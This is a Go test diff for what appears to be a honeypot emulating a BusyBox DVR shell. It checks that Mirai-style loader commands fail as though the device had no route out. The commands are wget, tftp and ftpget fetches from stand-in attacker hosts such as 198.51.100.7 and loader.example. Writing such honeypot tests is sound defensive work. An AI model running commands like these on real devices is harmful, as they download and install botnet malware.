@@ -212,3 +212,26 @@ func TestLsOnAFileNamesIt(t *testing.T) {
 		}
 	}
 }
+
+// SECURITY.md: a download is never reported as successful. On the DVR the
+// BusyBox downloaders fail like a box with no route out, which also sends
+// Mirai loaders on to their echo fallback, the one that delivers the binary.
+func TestDVRDownloadersFailWithoutEgress(t *testing.T) {
+	s := newDVR()
+	for line, want := range map[string]string{
+		"wget http://198.51.100.7/x.sh":                "Connecting to 198.51.100.7 (198.51.100.7:80)\r\nwget: can't connect to remote host (198.51.100.7): Connection timed out",
+		"/bin/busybox wget http://198.51.100.7:8080/a": "Connecting to 198.51.100.7:8080 (198.51.100.7:8080)\r\nwget: can't connect to remote host (198.51.100.7): Connection timed out",
+		"busybox wget http://loader.example/b":         "wget: bad address 'loader.example'",
+		"tftp -g -r m 198.51.100.7":                    "tftp: timeout",
+		"/bin/busybox tftp -g 198.51.100.7 -r t -l-":   "tftp: timeout",
+		"ftpget 198.51.100.7 f ftpget":                 "ftpget: can't connect to remote host (198.51.100.7): Connection timed out",
+	} {
+		out, code, _ := s.Run(line)
+		if out != want || code != 1 {
+			t.Errorf("%q -> (%q, %d), want (%q, 1)", line, out, code, want)
+		}
+	}
+	if out, _, _ := s.Run("ls /bin"); !strings.Contains(out, "wget") || !strings.Contains(out, "tftp") {
+		t.Errorf("ls /bin = %q, want the downloaders listed", out)
+	}
+}
